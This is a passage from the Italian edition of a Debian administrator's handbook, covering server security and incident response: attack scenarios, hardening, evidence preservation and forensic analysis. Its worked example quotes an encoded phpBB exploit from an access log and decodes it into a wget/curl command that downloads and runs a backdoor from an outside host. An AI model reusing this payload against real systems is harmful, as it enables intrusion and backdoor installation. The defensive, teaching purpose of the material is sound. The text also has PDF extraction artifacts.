      Filtraggio delle              over ows occorre limitare la lunghezza di alcuni parametri. Molto genericamente è
                                    possibile stabilire la validazione dei parametri ancor prima che vengano trasmessi
      queries HTTP                  all’applicazione Web e limitarne l'accesso secondo diversi criteri. Inoltre potrete
                                    combinare tutto ciò con dei dynamic rewall updates [vedi anche RADIUS Server]
                                    allo scopo di bannare per un dato periodo di tempo dall’accesso del web server
                                    l’utente reo di aver violato le regole.
                                    Tali controlli sono piuttosto prolissi ed onerosi da impostare, ma i loro costi sono
                                    ripagati con le applicazioni web distribuite in cui gli avvisi di sicurezza si basano su
                                    un dubious track record [lett. “un registro di tracciamento dei sospetti”].
                                    mod-security2 (incluso nel pacchetto libapache2-mod-security2) è il modulo
                                    principale che può essere utilizzato per il suddetto scopo. Offre diverse regole
                                    pronte all’uso facile da installare (attraverso il pacchetto modsecurity-crs).

     Le conseguenze di un intrusione possono essere più o meno evidenti (con diversi livelli di
     “obvioness” - evidenza) a seconda dell'intenzione dell'attaccante. I script-kiddies si limitano ad
     implementare i contenuti [riguardo ad attacchi] che trovano sui siti web; i loro attacchi sono spesso
     atti vandalici nei confronti di una pagina web o la cancellazione di dati. Nei casi più sopraf ni
     aggiungono contenuti invisibili nelle pagine Web per migliorare la Search Engine Optimization
     (SEO) dei loro siti.

     Un attaccante più esperto non si accontenterà del suddetto misero risultato. Difatti un “disaster
     scenario” potrebbe svolgersi come segue: l'attaccante acquisisce la possibilità di eseguire comandi
     come www-data user, ma l’esecuzione di un comando in sé richiede diversi raggiri. Cercherà
     pertanto di sempli carsi la vita installando altre applicazioni web designate per eseguire da remoto
     diversi tipi di comandi, per ottenere: la consultazione del lesystem, l’analisi dei permessi,
     l’immissione e lo scaricamento di les, l’esecuzione dei comandi e persino una network shell. Spesso
     la vulnerabilità consente l’esecuzione del comando wget che scarica un malware in /tmp/ e poi
     implementa il malware. Il malware viene scaricato da un server esterno precedentemente
     compromesso, in modo da poter celare le tracce ed impedire di poter risalire all'origine dell'attacco.

     Giunto a questo punto, l'attaccante ha suf ciente libertà d’azione da installare un bot IRC (un robot
     che si connette ad un server IRC e può essere controllato tramite lo stesso canale IRC). Questo bot è
     spesso usato per scambiare les illegali (copie di lms e software non autorizzate, ecc.). Ma un
     attaccante potrebbe spingersi oltre. Difatti l'account www-data non ha l’accesso completo alla
     macchina, pertanto l’attaccante potrebbe tentare di ottenere i privilegi di amministratore. In teoria
     dovrebbe essere impossibile, ma se l'applicazione web non è aggiornata, è probabile che anche il
     kernel o un altro programma non sia aggiornato [e ciò comporta effetti indesiderati]; difatti tale
     contesto si veri ca se l'amministratore nonostante una vulnerabilità nota, sfruttabile solo

     Pagina 436 Il Manuale dell’Amministratore di Debian TDAH_2.0
fl
        fi
             fi
                     fi
                          fi
                               fi
                                         fi
                                              fi
                                                   fi
                                                             fi
                                                                                                   fi
     localmente, non effettua i dovuti aggiornamenti dato che il server non ha utenti locali. L'attaccante
     di conseguenza appro tta di questa seconda vulnerabilità per ottenere l'accesso come root.

                               Questa nozione include qualunque tecnica idonea ad ottenere più diritti rispetto a
                 DIZIONARIO    quelli che un dato utente dovrebbe avere. Il programma sudo è designato a tale
           Escalation dei      scopo: difatti concede i diritti di amministratore ad alcuni utenti. Ma tale nozione
           privilegi           viene anche usata per descrivere l'azione di un attaccante che sfrutta (exploiting
                               in inglese) una vulnerabilità per ottenere illegittimamente dei diritti che non
                               possiede.

     L’attaccante nalmente controlla la macchina; quindi cercherà di mantenere l'accesso privilegiato il
     più lungo possibile. Per fare ciò l’attaccante installa un rootkit, un programma che sostituisce
     alcune componenti del sistema in modo da riottenere facilmente i privilegi di amministratore; inoltre
     i rootkits cercano in genere di nascondere la loro esistenza e le tracce dell'intrusione. Il programma
     ps (ormai compromesso) omette di elencare determinati processi, il programma netstat non
     riporta alcune connessioni attive, ecc.
     Grazie ai diritti di root, l'attaccante è stato in grado di consultare l'intero sistema, ma non ha trovato
     i les per lui importanti; onde per cui l’attaccante tenta di accedere ad altre macchine connesse alla
     rete aziendale. Per implementare quanto sopra descritto l’attaccante decide di analizzare l’account
     dell’amministratore e la cronologia dei les per trovare altre macchine regolarmente disponibili.
     Attraverso un programma compromesso l’attaccante sostituisce sudo o ssh per intercettare le
     passwords dell’amministratore, che verranno utilizzate sui servers rilevati… e l’intrusione può
     diffondersi d’ora in poi. Tale contesto viene de nito con un espressione inglese ossia nightmare
     scenario (scenario da incubo, il peggiore contesto veri cabile in assoluto) ed esistono delle
     contromisure per scongiurarlo. I prossimi paragra trattano queste contromisure.

     14.6.3. Scegliere il software con prudenza

     Ora che siete consapevoli dei potenziali problemi di sicurezza, dovrete prestare loro attenzione in
     ogni fase del deployment di un servizio, specialmente nella scelta del software da installare. Diversi
     siti web come SecurityFocus.com elencano le vulnerabilità recentemente scoperte in modo che
     possiate avere un’idea del security track record del software prima del suo deployment.
     Ovviamente dovrete anche bilanciare tali informazioni con la popolarità del suddetto software: più
     utenti utilizzano tale software, più costituisce un potenziale obiettivo, tanto da essere analizzato
     attentamente. Purtroppo anche il software di nicchia potrebbe essere pieno di falle di sicurezza non
     condivise pubblicamente in quanto non ritenuto valevole di un audit di sicurezza.

                               Un security audit è una lettura approfondita ed una conseguente valutazione del
               DIZIONARIO
                               codice sorgente di un software al ne di scovare eventuali vulnerabilità di sicurezza
           Security Audit
                               che potrebbe contenere. Diversi audits sono spesso misure proattive che vengono
                               condotte per garantire che un software sia conforme a determinati requisiti di
                               sicurezza.

     Il mondo del software libero offre generalmente un’ampia possibilità di scelta e di conseguenza
     avrete sicuramente modo di scegliere la componente software secondo i vostri criteri.
     Paradossalmente un software più funzionalità offre, più aumentano i rischi di vulnerabilità celate

                                                             TDAH_2.0      Capitolo XIV - Sicurezza Pagina 437
fi
      fi
                  fi
                          fi
                                  fi
                                          fi
                                               fi
                                                    fi
     nel suo codice; difatti il software più avanzato spesso si rivela controproducente ed è meglio
     privilegiare nella scelta il software più semplice che soddisfa le esigenze reali.

           DIZIONARIO                 Un attacco zero-day exploit è dif cile da scongiurare; tale nozione indica un
      Zero-day exploit                attacco che si basa su una vulnerabilità non ancora nota agli autori del software.

     14.6.4. Gestire una macchina nel suo insieme

     La maggior parte delle distribuzioni Linux installa diversi servizi Unix e strumenti per impostazione
     prede nita. In molti casi, i suddetti servizi e strumenti non sono necessari per i propositi
     dell’amministratore in base ai quali con gura la macchina. Spesso le linee guida che trattano
     tematiche riguardanti la sicurezza suggeriscono di eliminare tutto ciò che non è necessario. Ossia
     non è possibile garantire la sicurezza ad esempio di un FTP server se un altro servizio, tra l’altro
     inutilizzato, può essere impiegato per carpire i privilegi dell’amministratore sull’intera macchina.
     In base alla stessa logica, la con gurazione di un rewall viene implementata in modo che conceda
     solo l'accesso ai servizi che devono essere condivisi pubblicamente.
     Le capacità dei computers odierni sono suf cientemente potenti da permettere di poter ospitare più
     servizi sulla stessa macchina sica. Questa possibilità è economicamente giusti cata dato che: di
     fatto occorre amministrare una sola macchina; viene risparmiato il consumo energetico; ecc. Ma dal
     punto di vista della sicurezza, questa scelta è piuttosto onerosa. In pratica un unico servizio
     compromesso può comportare dapprima l’accesso alla macchina e poi consentire di compromettere
     gli altri servizi ospitati sulla stessa macchina. Per limitare i rischi pertanto è consigliabile isolare i
     diversi servizi. Potrete mettere in atto ciò attraverso la virtualizzazione (sistema in cui ciascun
     servizio viene ospitato su una macchina virtuale o un container dedicato) o attraverso AppArmor/
     SELinux, (sistema in cui ciascun demone dei servizi comprende un set di permessi con gurato ad
     hoc).

     14.6.5. Gli utenti sono Giocatori/Attori

     Quando si parla di sicurezza si pensa subito alla protezione dagli attacchi dei crakers anonimi che
     occultano le loro tracce nella giungla di Internet; ma spesso si dimentica che i rischi provengono
     dall'interno: un dipendente in procinto di lasciare la società che scarica i les sensibili sui progetti
     più importanti per venderli ai concorrenti; un venditore negligente che lascia la sessione aperta
     senza bloccarla durante un meeting su un nuovo progetto; un utente distratto che cancella la
     directory sbagliata per errore; ecc.

     La risposta a questi rischi può essere di natura tecnica: permessi per gli utenti entro e non oltre i
     requisiti minimi ed è consigliabile avere backup regolari. Ma nella maggior parte di casi è
     consigliabile formare gli utenti contro i rischi.

              BREVE                   Il pacchetto autolog include un programma che disconnette automaticamente gli
            ACCENNO                   utenti inattivi con gurando un delay massimo (ritardo). Implementa inoltre il
      autolog                         killing dei processi utente che persistono dopo la loro ne sessione (in modo da
                                      impedire agli utenti di eseguire demoni).

     Pagina 438 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
         fi
                       fi
                            fi
                                 fi
                                          fi
                                               fi
                                                    fi
                                                         fi
                                                                               fi
                                                                                      fi
                                                                                               fi
     14.6.6. Sicurezza sica

     Non ha senso proteggere tutti i servizi e la rete se i computers non sono protetti. È consigliabile
     memorizzare i dati più importanti su hard disks hot swap in un array RAID per garantirne la
     disponibilità nonostante i potenziali guasti. Ma qualsiasi protocollo di sicurezza è inutile, se dopo
     aver fatto tutto ciò, il fattorino della pizza è comunque in grado di entrare nell'edi cio, di accedere
     nella sala server e di portare dei dischi selezionati... Chi è autorizzato ad entrare nella sala server?
     L’accesso è monitorato? Queste domande (e le conseguenti risposte) devono essere considerate
     durante il processo di valutazione di sicurezza sica.

     La sicurezza sica include anche la valutazione dei rischi dovuti ad eventi accidentali come gli
     incendi. Ciò giusti ca l'archiviazione dei backups in un altro edi cio o almeno in una cassaforte
     ignifuga.

     14.6.7. Responsabilità legale

     In qualità di amministratore bene cerete, più o meno implicitamente, della ducia degli utenti locali
     e della rete. Dovrete pertanto evitare qualsiasi negligenza di cui dei malfattori si appro tterebbero.

     Se un attaccante prende il controllo della vostra macchina e la usa come postazione di ricezione/
     trasmissione (denominata “relay system”, sistema a relè) per le sue attività illegali potrebbe
     causarvi problemi legali dato che le vittime di un attacco potrebbero fraintendere e considerarvi gli
     arte ci o i complici dell’attacco. Nel caso più comune, l'attaccante utilizzerà la vostra macchina per
     inviare spam, con degli effetti minimi (come potenziali iscrizioni in black list che vi impedirebbero di
     inviare emails legittime), ma comunque spiacevoli. In altri casi gli attacchi potrebbero essere
     implementati tramite la vostra macchina, ad esempio per attacchi Denial of Service. Ciò può
     comportare: una perdita del fatturato, perché i servizi legittimi non saranno disponibili ed i dati
     andranno persi; un costo economico, perché la parte offesa avvierà una causa legale contro di voi.
     Potrebbero difatti denunciarvi: il titolare dei diritti di un’opera intellettuale se una copia non
     autorizzata viene illegittimamente condivisa attraverso il vostro server; la società impegnata
     contrattualmente alla distribuzione dell’opera intellettuale e costretta a pagare delle penali a seguito
     dell’attacco.

     Purtroppo in questi casi invocare l’innocenza non è suf ciente; dovrete trovare prove evidenti di
     attività sospette di terze parti attraverso il vostro sistema ed individuare il loro indirizzo IP.
     Purtroppo ciò sarà per voi impossibile se imprudentemente trascurerete le raccomandazioni di
     questo capitolo e consentirete all’attaccante di ottenere facilmente un account privilegiato (in
     particolare l'account root) grazie al quale cancellerà le proprie tracce.

                                                           TDAH_2.0         Capitolo XIV - Sicurezza Pagina 439
fi
      fi
           fi
                fi
                            fi
                                         fi
                                                  fi
                                                           fi
                                                                       fi
                                                                                 fi
                                                                                      fi
14.7. Come comportarsi con una macchina compromessa

Nonostante tutta la buona volontà e le attenzioni riservate alla politica di sicurezza, qualsiasi
amministrazione prima o poi si confronta con un attacco hijacking [l’attaccante dirotta la
comunicazione fra due entità palesandosi come una di queste - esempi noti sono: l’attacco man in the
middle; browser hijacking; DNS hijacking; web site hijacking]. Questo paragrafo tratta le
linee guida per affrontare questi sfortunati eventi.

14.7.1. Rilevamento ed analisi dell’intrusione del Cracker

Prima di poter reagire ad un atto di cracking dovrete poter essere in grado di capire se siete una
vittima di un attacco. Difatti ciò non è scontato, soprattutto se non si dispone di un’infrastruttura di
monitoraggio adeguata.

Gli atti di cracking vengono spesso rilevati quando ormai hanno conseguenze dirette sui servizi
legittimi ospitati sulla macchina: l'improvvisa lentezza della connessione, l'impossibilità di
login per alcuni utenti o qualsiasi altro malfunzionamento. Di fronte a questi problemi,
l'amministratore è costretto ad analizzare la macchina ed a studiare meticolosamente le anomalie.
Solitamente si cerca la presenza di un processo insolito, ad esempio un processo denominato apache
invece di /usr/sbin/apache2. Dopodiché si annota il numero del process identi er e si veri ca /
proc/pid/exe per scoprire quale programma il processo sta effettivamente eseguendo:

# ls -al /proc/3719/exe
lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -> /var/tmp/.
-> bash_httpd/psybnc

Un programma installato in /var/tmp/ ed eseguito con l'identità del server web? Nessun dubbio, la
macchina è compromessa.

Questo è un semplice esempio, ma molti altri indizi possono mettere in allerta un amministratore:

• un’opzione di un comando che non funziona più; la versione del software che il comando richiede
   non corrisponde a quella che si presuppone sia installata secondo dpkg;
• un prompt di comandi o il session greeting [l’annuncio per la richiesta di sessione] che indica che
l'ultima connessione proviene da un server remoto in un altro continente;
• gli errori causati da una partizione /tmp/ che risulta contenere copie illegali di lms;
• ecc.

14.7.2. Mettere il server of ine

Nella stragrande maggioranza dei casi, il cracking proviene dalla rete ed una rete funzionante è
indispensabile per l’attaccante per raggiungere i suoi targets [bersagli-obiettivi] (accesso a dati
riservati, condivisione di les illegali, occultazione dell’identità utilizzando la macchina come relay,
ecc.). La disconnessione del computer dalla rete impedirà all'attaccante di raggiungere i suoi
obiettivi qualora ancora non lo avesse fatto.

Pagina 440 Il Manuale dell’Amministratore di Debian TDAH_2.0
              fi
                   fl
                                                                       fi
                                                                            fi
                                                                                   fi
     Questo è possibile solo se avete accesso sico al server. In caso contrario, ad esempio se il server è
     ospitato da un hosting provider dall’altra parte del paese o se il server non è raggiungibile per altre
     ragioni, potrebbe essere saggio raccogliere le informazioni più importanti (andate a leggere il
     paragrafo: 14.7.3, “Preservare tutto ciò che può costituire una prova” a pagina 441; il paragrafo
     14.7.5, “Analisi forense” a pagina 442; il paragrafo 14.7.6, “Ricostruzione dello scenario di un
     attacco” a pagina 443) e dopodiché isolare il server il più possibile interrompendo il maggior numero
     di servizi (solitamente tutto tranne sshd). Un case simile è un grattacapo dato che è impossibile
     essere certi che l’attaccante non abbia ottenuto l'accesso SSH come amministratore; è dif cile in
     queste condizioni pulire la macchina.

     14.7.3. Preservare tutto ciò che può costituire una prova

     Se vorrete capire come si è svolto un attacco o adire le vie legali nei confronti degli attaccanti,
     dovrete fare una copia di tutti gli elementi importanti: in particolare il contenuto degli hard disks,
     l'elenco di tutti i processi in esecuzione e l'elenco di tutte le connessioni aperte. In teoria potreste
     includere anche i contenuti della RAM, anche se solitamente non vengono presi in considerazione.
     Gli amministratori, in uenzati dallo stress del contesto, potrebbero essere tentati di effettuare dei
     controlli sulla macchina compromessa, ma è una pessima idea. Qualunque comando eseguirete
     potrebbe essere a sua volta compromesso e cancellare le prove. Dovrete limitare le veri che ad
     elementi di con gurazione essenziali (netstat -tupan per le connessioni di rete, ps auxf per
     l'elenco dei processi, ls -alR /proc/[0-9]* per informazioni aggiuntive sui programmi in
     esecuzione) e annotare sistematicamente ogni veri ca.

                              Potreste essere tentati di analizzare un sistema mentre processa, soprattutto se
          ATTENZIONE          non si dispone di un accesso sico al server, ma ciò sarebbe inutile: difatti non
      Hot analysis            potrete mai darvi dei programmi installati su un sistema compromesso. Il
      [Analisi da             comando ps ormai compromesso potrebbe occultare qualche processo; oppure il
      remoto - hot            comando ls (compromesso) potrebbe omettere qualche le; persino il kernel
      links]                  potrebbe essere compromesso!
                              Se, nonostante ciò, dovrete effettuare un’analisi simile, quanto meno utilizzate dei
                              programmi che non ritenete compromessi. Ad esempio un CD-Rom di ripristino
                              contenente programmi “puliti” o una condivisione di rete con permessi di sola
                              lettura. In ogni caso se il kernel è compromesso anche queste contromisure
                              potrebbero non essere suf cienti.

     Salvati gli elementi "dinamici" più importanti, è necessario memorizzare un'immagine completa
     dell’hard disk. Tale operazione non è attuabile su un’immagine con un le system ancora in
     evoluzione pertanto dovrete effettuarne il remount in modalità di sola lettura. La soluzione più
     semplice è forzare l’arresto del server (dopo aver eseguito sync) e riavviarlo con un CD-Rom di
     ripristino. Dovrete copiare ogni partizione con un tool come ad esempio dd; le immagini potranno
     essere inviate poi ad un altro server (ad esempio con uno strumento come nc). Una soluzione
     alternativa ed ancora più semplice è estrarre il disco dalla macchina e sostituirlo con un disco nuovo
     che può essere riformattato e reinstallato.

                                                             TDAH_2.0      Capitolo XIV - Sicurezza Pagina 441
fi
        fi
               fl
                    fi
                         fi
                                  fi
                                              fi
                                                   fi
                                                                     fi
                                                                                        fi
                                                                                             fi
                    14.7.4. Reinstallazione

                    Prima di rimettere online il server, è essenziale reinstallarlo completamente. Difatti se la
                    compromissione è grave (ed i privilegi di amministratore sono stati carpiti), non potrete essere mai
                    certi di aver eliminato qualsiasi elemento l'attaccante abbia installato ad hoc (come ad esempio delle
                    backdoors). Dovrete pertanto installare anche tutti gli ultimi aggiornamenti di sicurezza per
                    chiudere la falla che l'attaccante è riuscito a sfruttare. Teoricamente attraverso un'analisi ex ante
                    dovreste essere in grado di individuare il vettore dell'attacco in modo da eliminarlo durante
                    l’installazione; in pratica solitamente si spera che gli aggiornamenti abbiano risolto la vulnerabilità e
                    che di conseguenza siano suf cienti.
                    Purtroppo per un server remoto, la reinstallazione non è sempre facile da eseguire; spesso dovrete
                    rivolgervi all’assistenza del hosting provider in quanto non tutte le società offrono sistemi di
                    reinstallazione automatica.
                    Inoltre dovrete fare attenzione a non ripristinare la macchina da backups successivi alla data
                    dell’attacco. Idealmente è consigliabile recuperare soltanto i dati e reinstallare il software da un
                    supporto di archiviazione.

                    14.7.5. Analisi forense

                    Ripristinato il servizio, potrete analizzare le immagini del disco del sistema compromesso per
                    individuare il vettore dell’attacco. Quando effettuerete il mounting dell’immagine dovrete avere cura
                    di utilizzare le opzioni ro, nodev, noexec, noatime in modo da non modi carne il contenuto
                    (compresi i timestamps di accesso ai le) e non mettere in esecuzione gli eseguibili compromessi.

                    Per ricostruire ef cacemente lo scenario di un attacco, dovrete analizzare tutto ciò che è stato
                    modi cato ed eseguito:

                    • i les .bash_history offrono un’adeguata lettura;
                    • anche l'elenco dei les recentemente creati, modi cati o aperti è pertinente;
                    • il comando strings consente l'identi cazione dei programmi installati dall'attaccante attraverso
                    l’estrazione delle stringhe presenti in un binario;
                    • i log les in /var/log/ consentono di ricostruire una cronologia degli eventi;
                    • in ne alcuni strumenti specializzati consentono di recuperare i les opportunamente cancellati
                      dall’attaccante come i log les.

                    Alcune delle suddette operazioni possono essere svolte attraverso software specializzato. In
                    particolare il pacchetto sleuthkit offre diversi strumenti per analizzare un le system. La GUI
                    Autopsy Forensic Browser (inclusa nel pacchetto autopsy) vi faciliterà nel loro utilizzo. Diverse
                    distribuzioni Linux dispongono di un’immagine “live install” che contiene diversi programmi per
                    l’analisi forense come ad esempio: Kali Linux attraverso la modalità forensic (per maggiori
                    informazioni andate a leggere il paragrafo A.8 “Kali Linux” a pagina 472); BlackArchLinux,
                    disponibile in https://blackarch.org; la distribuzione commerciale Grml-Forensic, basata su Grml
                    (per maggiori informazioni andate a leggere il paragrafo A.6 “Grml” a pagina 472);

                    Pagina 442 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
          fi
               fi
                         fi
                              fi
                                   fi
                                        fi
                                              fi
                                                   fi
                                                            fi
                                                                          fi
                                                                                   fi
                                                                                        fi
     14.7.6. Ricostruzione dello scenario di un attacco

     Tutti gli elementi raccolti durante l'analisi devono coincidere fra loro come il mosaico di un puzzle: la
     data di creazione dei primi les sospetti consente attraverso i correlati log les di risalire
     all’intrusione. Il sottostante esempio “pratico” dovrebbe essere più esauriente rispetto ad un lungo
     discorso teorico. Pertanto troverete a seguire un estratto di un le access.log di Apache:

     www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] ”GET /phpbb/viewtopic.
     -> php?t=10&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr
     -> (47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr
     -> (119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr
     -> (97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr
     -> (97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr
     -> (105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr
     -> (114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr
     -> (124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr
     -> (108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr
     -> (121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr
     -> (101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr
     -> (97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr
     -> (98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)
     -> %252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)
     -> %252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)
     -> %252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252
     -> echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1” 200 27969
     -> ”-” ”Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”

     Il soprastante esempio mostra l’exploit (sfruttamento) di una nota falla di sicurezza di phpBB.

           http://secunia.com/advisories/13239/
           https://www.phpbb.com/phpBB/viewtopic.php?t=240636

     Decodi cando questo lungo URL, è possibile comprendere che l'attaccante è riuscito ad
     implementare diverso codice PHP ossia: system(”cd /tmp;wget gabryk.altervista.org/bd ||
     curl gabryk.altervista.org/bd -o bd;chmod +x bd;./bd &"). Difatti esiste un le bd in
     /tmp/. Inoltre il comando strings /mnt/tmp/bd restituisce, tra le molte stringhe, PsychoPhobia
     Backdoor is starting… Di conseguenza è evidente che si tratta di una backdoor.

     Dopodiché questo accesso è stato utilizzato per scaricare, installare ed eseguire un bot IRC che è
     stato a sua volta collegato a una rete IRC nascosta. Il bot di conseguenza può essere controllato
     attraverso il suddetto protocollo ed istruito per scaricare i les per renderli condivisi. Inoltre il bot
     ha un suo log le:

     **     2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it
     ->     NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
     **     2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.
     ->     POOL8250.INTERBUSINESS.IT
     **     2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to
     ->     82.50.72.202:1024
     **     2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating

                                                                TDAH_2.0        Capitolo XIV - Sicurezza Pagina 443
fi
      fi
                      fi
                                                      fi
                                                           fi
                                                                           fi
                                                                                           fi
** 2004-11-29-19:50:20: DCC     CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC     Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_
-> DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC     Send Accepted from GAB: La_tela_dell_assassino.avi
-> (666615KB)
(...)
** 2004-11-29-21:10:36: DCC     Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9
-> KB/sec)
(...)
** 2004-11-29-22:18:57: DCC     Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec,
-> 80.2KB/sec)

Le tracce del log les evidenziano la presenza di due les video che sono stati caricati sul server
attraverso l’IP 82.50.72.202.

In aggiunta, l'attaccante ha scaricato un altro paio di les /tmp/pt e /tmp/loginx. Analizzandoli
con strings sono state trovate tra le stringhe Shellcode placed at 0x%08lx e Now wait for suid
shell... È evidente che si tratta di programmi che sfruttano le vulnerabilità locali per ottenere i
privilegi di amministratore. Ma hanno raggiunto il loro obiettivo? In questo caso non è probabile
dato che nessun les sembrerebbe essere stato modi cato dopo la violazione.

Nel soprastante esempio è stato possibile ricostruire tutte le fasi dell'intrusione e dedurre che
l'attaccante è stato in grado di utilizzare il sistema compromesso per 3 giorni; comunque ciò che più
conta in questa analisi è l’identi cazione della vulnerabilità in modo che l’amministratore possa
correggerla durante la reinstallazione.

Pagina 444 Il Manuale dell’Amministratore di Debian TDAH_2.0
    fi
     fi
                   fi
                                        fi
                                             fi
                                                  fi
         Parole chiave
Backport
Rebuild
Source package
Archivio
Meta-package
Debian Developer
Maintainer

